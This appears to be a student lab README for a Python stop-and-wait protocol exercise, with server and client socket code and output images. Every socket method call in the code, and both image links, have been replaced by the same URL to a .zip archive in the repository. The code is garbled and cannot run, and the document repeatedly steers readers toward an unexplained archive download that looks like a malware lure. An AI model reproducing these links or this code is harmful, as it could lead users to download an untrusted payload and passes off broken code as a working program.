# 2a_Stop_and_Wait_Protocol
## NAME :YUGABHARATHI M
## REGISTER NO:212224230314
## AIM 
To write a python program to perform stop and wait protocol
## ALGORITHM
1. Start the program.
2. Get the frame size from the user
3. To create the frame based on the user request.
4. To send frames to server from the client side.
5. If your frames reach the server it will send ACK signal to client
6. Stop the Program
## PROGRAM
### server:
```python
import socket

server = https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip()
https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip(('localhost', 8000))
https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip(1)
print("Server is listening...")
conn, addr = https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip()
print(f"Connected with {addr}")

while True:
    data = https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip(1024).decode()

    if data:
        print(f"Received: {data}")
        https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip("ACK".encode())

        if https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip() == 'exit':  
            print("Connection closed by client")
            https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip()
            break

```

### client:
```python

import socket
import time

client = https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip()
https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip(('localhost', 8000))
https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip(5)  

while True:
    msg = input("Enter a message (or type 'exit' to quit): ")

    https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip(https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip())  

    if https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip() == 'exit':  
        print("Connection closed by client")
        https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip()
        break

    try:
        ack = https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip(1024).decode()
        if ack == "ACK":
            print(f"Server acknowledged: {ack}")
    except https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip
        print("No ACK received, retransmitting...")
        continue  

```
## OUTPUT
### client:
![image](https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip)

### server:
![image-1](https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip)

## RESULT
Thus, python program to perform stop and wait protocol was successfully executed.
